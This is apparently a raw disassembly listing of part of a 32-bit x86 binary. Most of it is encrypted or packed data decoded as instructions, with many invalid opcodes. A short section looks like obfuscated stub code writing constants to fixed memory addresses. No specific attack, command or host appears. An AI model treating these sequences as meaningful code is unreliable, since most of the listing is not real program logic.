  406ae9:	jno    0x406ad0
  406aeb:	dec    esp
  406aec:	inc    edi
  406aed:	and    BYTE PTR es:[edi-0x5c],dl
  406af1:	and    ch,BYTE PTR [esi]
  406af3:	add    al,0x2e
  406af5:	aam    0x74
  406af7:	das    
  406af8:	xor    BYTE PTR [ebx+0x76058cb0],cl
  406afe:	inc    esp
  406aff:	push   ebp
  406b00:	les    esp,FWORD PTR [eax]
  406b02:	jp     0x406b53
  406b04:	mov    al,0xf1
  406b06:	dec    ebx
  406b07:	es (bad) 
  406b0a:	sahf   
  406b0b:	push   edx
  406b0c:	lahf   
  406b0d:	leave  
  406b0e:	mov    edi,0xe6725af1
  406b13:	daa    
  406b14:	cmp    BYTE PTR [ecx+0x59],0x64
  406b18:	push   0x79971a72
  406b1d:	(bad)  
  406b1e:	pop    ebp
  406b1f:	shr    DWORD PTR [ecx+0x5aac79f9],0x8a
  406b26:	rcl    DWORD PTR [esi],0x82
  406b29:	iret   
  406b2a:	retf   0x3a2b
  406b2d:	scas   al,BYTE PTR es:[edi]
  406b2e:	pop    ebp
  406b2f:	loopne 0x406b0b
  406b31:	call   ecx
  406b33:	or     eax,0x79a2ab1
  406b38:	(bad)  
  406b39:	nop
  406b3a:	adc    al,0xd6
  406b3c:	xchg   DWORD PTR [edi],edx
  406b3e:	dec    esi
  406b3f:	not    DWORD PTR [ebx-0x7edc8d5e]
  406b45:	push   ds
  406b46:	fiadd  WORD PTR [eax+edx*1+0x23cbcf74]
  406b4d:	xchg   DWORD PTR [esi],edx
  406b4f:	xchg   esi,eax
  406b50:	pushf  
  406b51:	jp     0x406b8b
  406b53:	ror    edx,1
  406b55:	sub    cl,BYTE PTR [eax]
  406b57:	jecxz  0x406af4
  406b59:	cwde   
  406b5a:	xchg   esp,eax
  406b5b:	dec    edi
  406b5c:	add    al,0x72
  406b5e:	xor    DWORD PTR [edi-0x54],edi
  406b61:	int3   
  406b62:	and    eax,0xdb6bfd1d
  406b67:	mov    edi,0x88d3b7b8
  406b6c:	mov    ah,0x43
  406b6e:	pushf  
  406b6f:	dec    ecx
  406b70:	repnz pop ebp
  406b72:	cmc    
  406b73:	pop    es
  406b74:	push   edx
  406b75:	inc    ecx
  406b76:	(bad)
  406b79:	sbb    BYTE PTR [eax],ch
  406b7b:	pop    esp
  406b7c:	and    eax,0x50cf0003
  406b81:	aad    0xa1
  406b83:	test   eax,0x612943e7
  406b88:	mov    dl,0x16
  406b8a:	xchg   esi,eax
  406b8b:	scas   al,BYTE PTR es:[edi]
  406b8c:	dec    ecx
  406b8d:	xor    ebx,0x49962950
  406b93:	dec    edx
  406b94:	popf   
  406b95:	push   edx
  406b96:	loope  0x406b35
  406b98:	dec    esp
  406b99:	arpl   si,sp
  406b9b:	test   esp,esi
  406b9d:	xchg   esp,eax
  406b9e:	ror    BYTE PTR [edx+0x4b94a219],cl
  406ba4:	aaa    
  406ba5:	scas   eax,DWORD PTR es:[edi]
  406ba6:	cld    
  406ba7:	not    DWORD PTR ds:0x2d7a9f60
  406bad:	adc    cl,BYTE PTR [eax+eax*2+0x5f1b8455]
  406bb4:	inc    ecx
  406bb5:	mov    ds:0xf47d285d,eax
  406bba:	or     BYTE PTR [ecx+0xb528e8e],0xda
  406bc1:	mov    edi,0xd4762166
  406bc6:	cmp    DWORD PTR [ebp-0x4b],ebp
  406bc9:	dec    esp
  406bca:	or     ah,BYTE PTR [eax+0x50]
  406bcd:	xor    ch,BYTE PTR [edi]
  406bcf:	push   ecx
  406bd0:	jg     0x406bc2
  406bd2:	xor    al,0x24
  406bd4:	inc    ebx
  406bd5:	(bad)  
  406bd6:	dec    edi
  406bd7:	jp     0x406b90
  406bd9:	test   BYTE PTR [esi],bh
  406bdb:	test   eax,0x934f1a2
  406be0:	mov    edi,0xc1571977
  406be5:	jbe    0x406b72
  406be7:	dec    ebp
  406be8:	xchg   ebp,eax
  406be9:	ins    DWORD PTR es:[edi],dx
  406bea:	xchg   ebp,eax
  406beb:	push   cs
  406bec:	inc    esi
  406bed:	loopne 0x406c0c
  406bef:	mov    dh,0xf
  406bf1:	jne    0x406c56
  406bf3:	mov    edi,es
  406bf5:	pop    ebx
  406bf6:	imul   esi,DWORD PTR [ebp+ebp*1-0x6e],0x59
  406bfb:	mov    eax,0xec95f9bd
  406c00:	clc    
  406c01:	(bad)  
  406c02:	jl     0x406c58
  406c04:	inc    esp
  406c05:	dec    esi
  406c06:	mov    eax,ds:0xb20e3619
  406c0b:	push   ecx
  406c0c:	add    al,0x5b
  406c0e:	pop    eax
  406c0f:	cmp    al,BYTE PTR [ebp+0x15]
  406c12:	pop    eax
  406c13:	enter  0xe7ad,0xdd
  406c17:	adc    BYTE PTR [ebx+0x182b9c15],cl
  406c1d:	(bad)  
  406c1e:	cmp    al,0xb4
  406c20:	lods   al,BYTE PTR ds:[esi]
  406c21:	sbb    DWORD PTR [edx+0x1874e2a7],esp
  406c27:	push   0xffffff82
  406c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c2a:	sub    esi,DWORD PTR [ebx]
  406c2c:	fwait
  406c2d:	jp     0x406c9c
  406c2f:	popf   
  406c30:	mov    ds:0x45ac9fcf,eax
  406c35:	mov    ds:0xca9e1d88,eax
  406c3a:	dec    esp
  406c3b:	int3   
  406c3c:	jp     0x406c51
  406c3e:	out    dx,eax
  406c3f:	js     0x406c7b
  406c41:	and    ah,BYTE PTR [edi-0x80]
  406c44:	pop    ecx
  406c45:	loop   0x406bd1
  406c47:	sub    al,0x11
  406c49:	icebp  
  406c4a:	mov    ebx,0x74ebd3be
  406c4f:	icebp  
  406c50:	(bad)  
  406c51:	jmp    0x2bbbba05
  406c56:	call   0xc080:0xe2e77645
  406c5d:	and    esi,DWORD PTR [ecx-0x3e]
  406c60:	push   0xa3b44cda
  406c65:	xor    DWORD PTR ds:0x4671cba7,ecx
  406c6b:	fmul   QWORD PTR [ebp-0x50c096ff]
  406c71:	stc    
  406c72:	je     0x406c3f
  406c74:	xor    DWORD PTR ss:[edx+0x7d],edx
  406c78:	mov    ebx,0xdc0b8fb2
  406c7d:	rol    DWORD PTR [edi],1
  406c7f:	dec    edi
  406c80:	and    eax,0xb74c405b
  406c85:	mov    esi,0x84db2dbe
  406c8a:	repz inc eax
  406c8c:	mov    bl,0x87
  406c8e:	xchg   esp,eax
  406c8f:	dec    eax
  406c90:	or     eax,0xa11e159b
  406c95:	adc    eax,0xd45dcd78
  406c9a:	popa   
  406c9b:	aam    0xe7
  406c9d:	aas    
  406c9e:	xor    ebx,ebx
  406ca0:	push   ebp
  406ca1:	in     al,dx
  406ca2:	jns    0x406ca1
  406ca4:	xchg   ebx,eax
  406ca5:	pop    ss
  406ca6:	ss dec esp
  406ca8:	lods   eax,DWORD PTR ds:[esi]
  406ca9:	cmp    eax,edi
  406cab:	mov    ah,0x94
  406cad:	xlat   BYTE PTR ds:[ebx]
  406cae:	mov    cl,0x78
  406cb1:	adc    eax,0x2524e526
  406cb6:	jae    0x406d1c
  406cb8:	jecxz  0x406c75
  406cba:	daa    
  406cbb:	retf   0xc027
  406cbe:	fisttp WORD PTR [edi]
  406cc0:	or     ecx,DWORD PTR [eax-0xf113c46]
  406cc6:	cli    
  406cc7:	xor    BYTE PTR [ebx],ah
  406cc9:	cmp    dh,dh
  406ccb:	xchg   ebx,eax
  406ccc:	pusha  
  406ccd:	ret    
  406cce:	hlt    
  406ccf:	pop    edi
  406cd0:	enter  0x1af3,0x69
  406cd4:	push   eax
  406cd5:	sub    BYTE PTR [ecx+0x7aebc5e2],bl
  406cdb:	outs   dx,BYTE PTR ds:[esi]
  406cdc:	lock xor esp,eax
  406cdf:	push   ebx
  406ce0:	sbb    BYTE PTR [esi-0x1e74ce59],ch
  406ce6:	sub    DWORD PTR [edx-0x5d2a92bd],ecx
  406cec:	adc    DWORD PTR [edx+eax*2+0x6c],0x95c1df4a
  406cf4:	and    edi,DWORD PTR [esi-0x56]
  406cf7:	loope  0x406d15
  406cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cfa:	mov    ds:0xfbbe1434,eax
  406cff:	ins    DWORD PTR es:[edi],dx
  406d00:	retf   0xa977
  406d03:	mov    ch,0x33
  406d05:	lahf   
  406d06:	sbb    dl,BYTE PTR [ebp+0x1897ea7]
  406d0c:	(bad)  
  406d0e:	adc    edi,eax
  406d10:	ds ret 0x3488
  406d14:	mov    ebx,0xdb4d6b86
  406d19:	jmp    0x39a0:0x474c9172
  406d20:	add    ah,dl
  406d22:	cmp    bl,cl
  406d24:	sub    BYTE PTR [ecx-0x6e],0xf0
  406d28:	ret    
  406d29:	loopne 0x406cb2
  406d2b:	icebp  
  406d2c:	iret   
  406d2d:	jp     0x406cbb
  406d2f:	loope  0x406cd0
  406d31:	add    esp,DWORD PTR [eax-0x72]
  406d34:	adc    al,0xd5
  406d36:	retf   0x4963
  406d39:	imul   esp,DWORD PTR [ecx],0x35
  406d3c:	add    DWORD PTR [eax-0x4b8281c8],ebp
  406d42:	bound  esi,QWORD PTR [ecx+0x11]
  406d45:	mov    bl,BYTE PTR [esi+0x1a]
  406d48:	cmp    ecx,DWORD PTR [ecx-0x195f88b4]
  406d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d4f:	mov    edx,0xf18323ff
  406d54:	pop    ecx
  406d55:	adc    DWORD PTR [eax-0x1a],ecx
  406d58:	mov    edi,0xe32eea54
  406d5d:	jge    0x406d95
  406d5f:	adc    DWORD PTR [eax+0x5],esi
  406d62:	mov    ch,0xf1
  406d64:	pop    ss
  406d65:	inc    ebp
  406d66:	outs   dx,BYTE PTR ds:[esi]
  406d67:	(bad)  
  406d68:	out    dx,eax
  406d69:	add    DWORD PTR [ebp-0x5b5c51ba],esi
  406d6f:	inc    esp
  406d70:	jle    0x406d75
  406d72:	mov    bl,0xb2
  406d74:	lds    edi,FWORD PTR [ebp-0x18364006]
  406d7a:	add    dh,BYTE PTR [ebp-0x7ad5bc4c]
  406d80:	outs   dx,BYTE PTR ds:[esi]
  406d81:	inc    edx
  406d82:	in     al,dx
  406d83:	push   es
  406d84:	(bad)  
  406d85:	or     eax,0x578468c0
  406d8a:	mov    al,ds:0x7254c99
  406d8f:	xor    BYTE PTR [ebx-0xc],0x41
  406d93:	inc    edx
  406d94:	in     eax,dx
  406d95:	aad    0x6c
  406d97:	and    eax,0x2db27135
  406d9c:	not    DWORD PTR [eax+0x692179ab]
  406da2:	aaa    
  406da3:	pop    DWORD PTR [ebp-0x1f]
  406da6:	dec    eax
  406da7:	mov    ah,0xa1
  406da9:	pusha  
  406daa:	je     0x406d3e
  406dac:	ins    BYTE PTR es:[edi],dx
  406dad:	loop   0x406d7a
  406daf:	rcr    ebp,cl
  406db1:	call   0xd99d27df
  406db6:	adc    eax,0x42fdd764
  406dbb:	or     bl,BYTE PTR [ebp-0x1]
  406dbe:	push   0x2168798c
  406dc3:	fs mov ebp,0xf46b6476
  406dc9:	lea    edi,[ebp-0x269c0b3f]
  406dcf:	ret    
  406dd0:	fisubr DWORD PTR [ebp-0x3ad944e2]
  406dd6:	xchg   edx,eax
  406dd7:	daa    
  406dd8:	sub    esi,DWORD PTR [edx+edx*4-0x5fff07de]
  406ddf:	sub    ah,dl
  406de1:	in     eax,0x5a
  406de3:	inc    edi
  406de4:	pop    es
  406de5:	call   0x4df0:0xbcc991d0
  406dec:	add    BYTE PTR [esi],ah
  406dee:	daa    
  406def:	test   al,dl
  406df1:	fnsave [ebp+0x6eeb8f62]
  406df7:	jbe    0x406db7
  406df9:	loopne 0x406d92
  406dfb:	mov    esp,0x8865f56f
  406e00:	sub    esi,DWORD PTR [edx]
  406e02:	sbb    bh,BYTE PTR [esi-0x44]
  406e05:	xor    esp,DWORD PTR ds:0xb10f86dd
  406e0b:	jae    0x406e0d
  406e0d:	enter  0x44f6,0x85
  406e11:	retf   
  406e12:	add    DWORD PTR [edi+0x70],0xffffffb6
  406e16:	mov    ebp,0x31396f39
  406e1b:	bound  ebp,QWORD PTR [edx-0x359b8806]
  406e21:	nop
  406e22:	mov    esi,DWORD PTR [eax+0x7df4db16]
  406e28:	xchg   esp,eax
  406e29:	mov    DWORD PTR [eax+0x38a9d42c],edx
  406e2f:	mov    WORD PTR [edi-0x52954ea1],?
  406e35:	lahf   
  406e36:	(bad)  
  406e37:	push   0xab7b476b
  406e3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e3e:	repz test eax,0x470615a8
  406e44:	mov    ebx,0x757eaef9
  406e49:	test   esi,esi
  406e4b:	pop    edx
  406e4c:	inc    edi
  406e4d:	arpl   WORD PTR [ebx-0x1faa7494],cx
  406e53:	mov    DWORD PTR ds:0x434547,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x4ebee2d1]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e64
  406e7b:	dec    esp
  406e7c:	jge    0x406e64
  406e7e:	and    ecx,0xcf67efde
  406e84:	mov    ds:0xd87e7bb9,eax
  406e89:	jg     0x406e83
  406e8b:	pushf  
  406e8c:	mov    WORD PTR gs:[ecx+0x67],cs
  406e90:	jle    0x406eba
  406e92:	ds dec sp
  406e95:	sub    ebx,0xffffffcf
  406e98:	and    al,0xbd
  406e9a:	pop    ebp
  406e9b:	out    0xad,eax
  406e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e9e:	(bad)  
  406e9f:	fldcw  WORD PTR ds:0xdb79ffb3
  406ea5:	and    BYTE PTR ds:0x932f38be,ch
  406eab:	iret   
  406eac:	inc    esi
  406ead:	mov    al,ds:0x8b78bd28
  406eb2:	sub    al,0x3d
  406eb4:	int3   
  406eb5:	jmp    0x2c50:0xedf4c54e
  406ebc:	pop    ds
  406ebd:	cdq    
  406ebe:	scas   al,BYTE PTR es:[edi]
  406ebf:	adc    BYTE PTR [eax+0x4],0xbe
  406ec3:	or     al,0xc7
  406ec5:	fidivr DWORD PTR [eax]
  406ec7:	mov    ecx,0xa797d3e3
  406ecc:	call   ecx
  406ece:	cmp    ebx,DWORD PTR [edi]
  406ed0:	stos   BYTE PTR es:[edi],al
  406ed1:	fwait
  406ed2:	push   ebx
  406ed3:	aad    0xa9
  406ed5:	sbb    al,0xf2
  406ed7:	inc    esi
  406ed8:	dec    edi
  406ed9:	jae    0x406ee9
  406edb:	push   ebp
  406edc:	clc    
  406edd:	mov    DWORD PTR [esi-0xf61728a],esi
  406ee3:	out    dx,al
  406ee4:	sbb    eax,0x899d23a3
  406ee9:	lods   eax,DWORD PTR ds:[esi]
  406eea:	dec    esp
  406eeb:	pop    ecx
  406eec:	push   ss
  406eed:	es retf 
  406eef:	(bad)  
  406ef0:	jae    0x406ec4
  406ef2:	cmp    eax,0x4fca85ee
  406ef7:	vmwrite ecx,DWORD PTR [ecx]
  406efa:	dec    edx
  406efb:	ficomp WORD PTR [edx+0xf]
  406efe:	mov    gs,WORD PTR [edi+0x4fb012bd]
  406f04:	scas   eax,DWORD PTR es:[edi]
  406f05:	sbb    DWORD PTR [edi-0x156cfb31],0xadf383ee
  406f0f:	in     al,dx
  406f10:	ja     0x406f3b
  406f12:	and    dh,BYTE PTR [ebp-0x43]
  406f15:	ja     0x406f00
  406f17:	cld    
  406f18:	retf   0xe981
  406f1b:	sti    
  406f1c:	scas   eax,DWORD PTR es:[edi]
  406f1d:	xor    al,0x1d
  406f1f:	ds into 
  406f21:	sbb    al,0xb1
  406f23:	sbb    DWORD PTR [ecx-0x70218938],edx
  406f29:	mov    WORD PTR [edi-0x1e],fs
  406f2c:	fsub   QWORD PTR [edi+0x599802e6]
  406f32:	loop   0x406f9e
  406f34:	add    DWORD PTR [edi-0x70],eax
  406f37:	push   0xaecddc69
  406f3c:	lahf   
  406f3d:	lea    edi,[eax]
  406f3f:	repnz loop 0x406fb6
  406f42:	call   0x8b4e8701
  406f47:	add    DWORD PTR [ebp-0x58841b2f],ebx
  406f4d:	out    dx,eax
  406f4e:	repz push edx
  406f50:	mov    ecx,0xe2d144a0
  406f55:	retf   0x3f16
  406f58:	(bad)  
  406f59:	shrd   DWORD PTR [ebp-0x6595d399],edi,cl
  406f60:	push   ss
  406f61:	(bad)  
  406f62:	or     al,0xcf
  406f64:	iret   
  406f65:	push   edx
  406f66:	mov    ch,0x34
  406f68:	or     DWORD PTR [edi],edi
  406f6a:	(bad)  
  406f6c:	jno    0x406f14
  406f6e:	mov    eax,ds:0xd7fda7c6
  406f73:	popa   
  406f74:	in     al,dx
  406f75:	ficom  WORD PTR [edi+0x3acf510a]
  406f7b:	loope  0x406f54
  406f7d:	sub    DWORD PTR [ebp-0x4f152edb],0xa8d8cdbe
  406f87:	push   edi
  406f88:	in     eax,0x71
  406f8a:	cli    
  406f8b:	icebp  
  406f8c:	mov    dh,0x2e
  406f8e:	pusha  
  406f8f:	sbb    ecx,ecx
  406f91:	(bad)  
  406f92:	mov    al,ds:0xd31f7874
  406f97:	add    edi,edx
  406f99:	mov    ch,0xbe
  406f9b:	imul   esi,DWORD PTR [ebx+0x39225788],0x4268fe40
  406fa5:	addr16 push 0xffffff82
  406fa8:	xor    al,dh
  406faa:	les    esi,FWORD PTR [ecx]
  406fac:	jp     0x407007
  406fae:	pushf  
  406faf:	mov    esp,DWORD PTR [edi]
  406fb1:	cdq    
  406fb2:	inc    ebx
  406fb3:	stc    
  406fb4:	sbb    cl,BYTE PTR [edi+0x899783a]
  406fba:	add    eax,0xca42d5cb
  406fbf:	test   al,0xf3
  406fc1:	mov    DWORD PTR [ecx-0x2dc8e6af],esi
  406fc7:	pop    ss
  406fc8:	push   ebp
  406fc9:	ins    BYTE PTR es:[edi],dx
  406fca:	test   al,0x33
  406fcc:	mov    edi,0x989d08e2
  406fd1:	jmp    0x22b6:0xb80ef6a6
  406fd8:	mov    ds:0xa55fd6b,al
  406fdd:	int3   
  406fde:	xchg   esp,eax
  406fdf:	sbb    ebx,DWORD PTR [ebx-0x5c44110c]
  406fe5:	dec    edx
  406fe6:	cmp    DWORD PTR [eax-0x27aef0af],eax
  406fec:	outs   dx,DWORD PTR ds:[esi]
  406fed:	sbb    ebp,DWORD PTR fs:[edi]
  406ff0:	jno    0x406fc6
  406ff2:	cld    
  406ff3:	les    edx,FWORD PTR [esi]
  406ff5:	in     eax,dx
  406ff6:	jg     0x407028
  406ff8:	xor    ah,BYTE PTR ds:0x4a88d7f7
  406ffe:	loopne 0x406fda
  407000:	repz js 0x407021
  407003:	lahf   
  407004:	cmc    
  407005:	int    0x87
  407007:	jl     0x406f8e
  407009:	lods   al,BYTE PTR ds:[esi]
  40700a:	shr    ch,1
  40700c:	mov    edi,0x1dd30fe9
  407011:	mov    dl,0x4c
  407013:	out    0xcd,eax
  407015:	jnp    0x407025
  407017:	fsubr  st,st(5)
  407019:	mov    cl,0x9b
  40701b:	fisub  DWORD PTR [ecx]
  40701d:	mov    al,ds:0xe9bc10c3
  407022:	gs fdiv st(7),st
  407025:	mov    edi,ecx
  407027:	dec    edx
  407028:	or     DWORD PTR [eax-0x6f5a92a3],ecx
  40702e:	push   eax
  40702f:	imul   edi,esp,0x5c8d9964
  407035:	pop    ecx
  407036:	arpl   WORD PTR [ebp+0x3e],bx
  407039:	(bad)  
  40703a:	loop   0x407016
  40703c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40703d:	xchg   esi,eax
  40703e:	cld    
  40703f:	repnz (bad) 
  407041:	out    0xf3,al
  407043:	mov    ds:0x40d19678,eax
  407048:	push   ds
  407049:	mov    DWORD PTR [esi],ebx
  40704b:	test   eax,0x96189978
  407050:	in     eax,dx
  407051:	retf   
  407052:	adc    eax,0x9c80579a
  407057:	xchg   esi,eax
  407058:	(bad)  
  407059:	lea    edi,[eax]
  40705b:	inc    esi
  40705c:	push   0x4b
  40705e:	pop    eax
  40705f:	jne    0x4070a3
  407061:	fidiv  WORD PTR [ecx]
  407063:	ins    BYTE PTR es:[edi],dx
  407064:	(bad)  
  407065:	out    0x96,eax
  407067:	mov    edx,0xcd27c833
  40706c:	clc    
  40706d:	ss pop ebx
  40706f:	pop    ds
  407070:	loop   0x407041
  407072:	cdq    
  407073:	push   edi
  407074:	(bad)  
  407075:	rcr    DWORD PTR [ebp-0x358ab10d],0xb4
  40707c:	add    bl,ch
  40707e:	sbb    al,0xb4
  407080:	scas   eax,DWORD PTR es:[edi]
  407081:	ins    DWORD PTR es:[edi],dx
  407082:	retf   
  407083:	mov    ebp,0x5ca1e2da
  407088:	ja     0x40709d
  40708a:	lods   al,BYTE PTR ds:[esi]
  40708b:	add    DWORD PTR [eax-0x53],ebp
  40708e:	into   
  40708f:	xor    ebx,0xffffff80
  407092:	daa    
  407093:	push   ebx
  407094:	adc    edi,DWORD PTR [edi+0x55]
  407097:	sbb    eax,0x49d69c3f
  40709c:	mov    edi,0xde241d10
  4070a1:	popa   
  4070a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070a3:	sub    BYTE PTR [ebp-0x70],dh
  4070a6:	add    eax,0x9d9d6275
  4070ab:	push   esp
  4070ac:	cmc    
  4070ad:	xor    esp,edx
  4070af:	outs   dx,DWORD PTR ds:[esi]
  4070b0:	jbe    0x407066
  4070b2:	imul   edi,DWORD PTR ds:0xbba81f5b,0xffffffe2
  4070b9:	outs   dx,DWORD PTR ds:[esi]
  4070ba:	cmp    eax,0xbe7f8af4
  4070bf:	call   DWORD PTR [eax]
  4070c1:	fidivr WORD PTR [esi-0x17]
  4070c4:	push   eax
  4070c5:	add    al,0x4b
  4070c7:	mov    ebp,0x6c9fee8d
  4070cc:	shl    BYTE PTR [esi],cl
  4070ce:	sbb    DWORD PTR ds:0x75d60b8a,edi
  4070d4:	aas    
  4070d5:	inc    eax
  4070d6:	bound  esi,QWORD PTR [edx-0x1d]
  4070d9:	rcl    BYTE PTR [ebx-0x20c9ba96],0x3b
  4070e0:	push   ds
  4070e1:	adc    ebx,DWORD PTR [eax-0x42318678]
  4070e7:	or     eax,0xa48806d0
  4070ec:	cdq    
  4070ed:	sbb    bh,BYTE PTR [ecx-0x43380327]
  4070f3:	mov    ebx,0x5fd859e2
  4070f8:	(bad)  
  4070f9:	scas   al,BYTE PTR es:[edi]
  4070fa:	xchg   BYTE PTR [edi+0x5592d0d1],dh
  407100:	push   esi
  407101:	jg     0x40714f
  407103:	pop    ebx
  407104:	and    DWORD PTR [ebx-0x15],ecx
  407107:	aaa    
  407108:	jae    0x407110
  40710a:	cli    
  40710b:	data16 jns 0x4070de
  40710e:	sub    BYTE PTR [ebp+ebx*2+0x71e6b576],cl
  407115:	mov    ds:0xc31b3940,eax
  40711a:	outs   dx,BYTE PTR ds:[esi]
  40711b:	fidiv  DWORD PTR es:0xef16225f
  407122:	aaa    
  407123:	add    ebx,0xffffffc0
  407126:	inc    esp
  407127:	retf   0xac6f
  40712a:	lods   al,BYTE PTR ds:[esi]
  40712b:	jae    0x407151
  40712d:	pop    edi
  40712e:	jmp    0x407120
  407130:	cmp    eax,0x24cf01b4
  407135:	shl    DWORD PTR [edi],1
  407137:	shr    DWORD PTR [ebp-0x25],0x9b
  40713b:	adc    eax,0x2f28181d
  407140:	rcr    ch,1
  407142:	lock pop ecx
  407144:	jmp    0x480b:0x337eb999
  40714b:	and    dl,bh
  40714d:	push   ebx
  40714e:	int3   
  40714f:	into   
  407150:	jbe    0x407182
  407152:	jecxz  0x4071b8
  407154:	hlt    
  407155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407156:	retf   0x3724
  407159:	int    0x6f
  40715b:	daa    
  40715c:	or     dl,al
  40715e:	or     ah,BYTE PTR [edx-0x3b]
  407161:	jnp    0x40713b
  407163:	mov    ds:0x85152d3a,al
  407168:	xchg   ebx,eax
  407169:	mov    ebp,0xb4bf9536
  40716e:	push   es
  40716f:	push   es
  407170:	dec    BYTE PTR [ecx-0x56]
  407173:	inc    esi
  407174:	lahf   
  407175:	ret    
  407176:	jmp    0x19e77a61
  40717b:	jecxz  0x4071d4
  40717d:	outs   dx,BYTE PTR ds:[esi]
  40717e:	shl    BYTE PTR [ebx],cl
  407180:	mov    ebx,0xa1063888
  407185:	popf   
  407186:	or     eax,0x1bc36991
  40718b:	ja     0x40711c
  40718d:	mov    edx,0xdb4a26d0
  407192:	dec    eax
  407193:	cmp    DWORD PTR [ebx+0x1d8a832b],edx
  407199:	popa   
  40719a:	add    ch,BYTE PTR [esi+0x38a9dc0c]
  4071a0:	out    dx,al
  4071a1:	jecxz  0x407149
  4071a3:	loope  0x4071e4
  4071a5:	dec    ecx
  4071a6:	mov    esp,0x562e140c
  4071ab:	xor    edx,DWORD PTR [edi+0x53]
  4071ae:	xlat   BYTE PTR ds:[ebx]
  4071af:	and    al,0x72
  4071b1:	rcl    DWORD PTR [edi+ecx*8],cl
  4071b4:	inc    esp
  4071b5:	adc    al,0xeb
  4071b7:	lods   eax,DWORD PTR ds:[esi]
  4071b8:	pushf  
  4071b9:	call   0x28e79891
  4071be:	xchg   ebp,eax
  4071bf:	or     edx,DWORD PTR [ebp-0x21]
  4071c2:	mov    ah,0xfd
  4071c4:	mov    eax,ds:0x186ee3f6
  4071c9:	sbb    eax,0xbcf29fe0
  4071ce:	jl     0x4071be
  4071d0:	scas   al,BYTE PTR es:[edi]
  4071d1:	rcr    DWORD PTR [eax],cl
  4071d3:	mov    cl,0xfc
  4071d5:	sub    edx,DWORD PTR [ebx+eax*2-0x5a44d050]
  4071dc:	inc    edi
  4071dd:	mov    cl,0x9b
  4071df:	push   edi
  4071e0:	inc    eax
  4071e1:	adc    edx,edx
  4071e3:	and    DWORD PTR [ecx],edx
  4071e5:	mov    ecx,0x314f64ec
  4071ea:	daa    
  4071eb:	or     DWORD PTR [ebp-0xdc7d503],esi
  4071f1:	mov    ds:0x48fed9eb,al
  4071f6:	mov    bh,0x1d
  4071f8:	(bad)  
  4071f9:	loop   0x4071b1
  4071fb:	push   0x2e41ebfa
  407200:	mov    al,0xd1
  407202:	push   es
  407203:	sub    ah,ah
  407205:	test   BYTE PTR [edx],bl
  407207:	mov    eax,0xf5eaf6c6
  40720c:	mov    edx,0x7f240277
  407211:	sub    BYTE PTR [esp+ecx*8],bh
  407214:	jns    0x40719d
  407216:	mov    edx,0x85971a26
  40721b:	inc    ecx
  40721c:	inc    eax
  40721d:	stos   BYTE PTR es:[edi],al
  40721e:	sbb    DWORD PTR [ebx],esi
  407220:	nop
  407221:	clc    
  407222:	jns    0x407249
  407224:	enter  0xe1bf,0x5
  407228:	daa    
  407229:	call   0x8bfa:0xcd1c1522
  407230:	mov    edx,0x7887f4f1
  407235:	cmp    eax,0xaab152bd
  40723a:	cmc    
  40723b:	ret    0x59d8
  40723e:	rcl    DWORD PTR [edi-0x3e85b51a],0x78
  407245:	jnp    0x40726d
  407247:	imul   edi,DWORD PTR [eax],0x51
  40724a:	mov    ebp,0x39d445c7
  40724f:	dec    edi
  407250:	add    BYTE PTR [eax],al
  407252:	mov    DWORD PTR ds:0x4344ef,0x15ae
  40725c:	cmp    eax,DWORD PTR [edx]
  40725e:	mov    DWORD PTR ds:0x4344df,0x344d
  407268:	je     0x40836f
  40726e:	mov    DWORD PTR [ebp-0xc],0x705fd8c
  407275:	lea    eax,[ebp-0xc]
  407278:	add    DWORD PTR ds:0x434613,0x4344e3
  407282:	mov    DWORD PTR [ebp-0x10],eax
  407285:	xor    eax,DWORD PTR ds:0x434507
  40728b:	mov    eax,DWORD PTR [ebp-0x10]
  40728e:	not    edx
  407290:	mov    edx,DWORD PTR [eax]
  407292:	or     DWORD PTR ds:0x4344fb,0x7c2e
  40729c:	imul   edx,edx,0xf89ea9ed
  4072a2:	mov    DWORD PTR ds:0x43454b,0x5d50
  4072ac:	mov    DWORD PTR [eax],edx
  4072ae:	mov    DWORD PTR ds:0x43453b,0x7ba0
  4072b8:	mov    eax,DWORD PTR [ebp-0xc]
  4072bb:	cmp    eax,0x9155269c
  4072c0:	je     0x4076db
  4072c6:	mov    edi,DWORD PTR ds:0x4345ef
  4072cc:	mov    eax,ds:0x434633
  4072d1:	sub    eax,edi
  4072d3:	sub    edi,DWORD PTR [edi+eax*1]
  4072d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4072d9:	or     DWORD PTR [eax],0x60751c9d
  4072df:	mov    eax,DWORD PTR [ebp-0x8]
  4072e2:	xor    eax,ecx
  4072e4:	add    eax,esi
  4072e6:	pop    edi
  4072e7:	pop    esi
  4072e8:	jmp    0x4076d6
  4072ed:	pop    ds
  4072ee:	add    al,0x2a
  4072f0:	or     eax,0x2c313d35
  4072f5:	add    eax,0xbe907a48
  4072fa:	scas   al,BYTE PTR es:[edi]
  4072fb:	in     eax,dx
  4072fc:	pop    ss
  4072fd:	aas    
  4072fe:	iret   
  4072ff:	jle    0x40737f
  407301:	dec    edi
  407302:	jns    0x407382
  407304:	jle    0x40730d
  407306:	push   dx
  407308:	arpl   WORD PTR [edx],cx
  40730a:	imul   ebp,DWORD PTR [ecx+0x276c9d73],0xa
  407311:	mov    dh,0xc3
  407313:	clc    
  407314:	push   edi
  407315:	pusha  
  407316:	stc    
  407317:	pop    ds
  407318:	addr16 (bad) 
  40731a:	out    dx,al
  40731b:	out    dx,al
  40731c:	xchg   BYTE PTR [esi-0x6f077dd1],dh
  407322:	(bad)  
  407323:	popf   
  407324:	jb     0x4072f0
  407326:	push   ss
  407327:	ror    al,0xa3
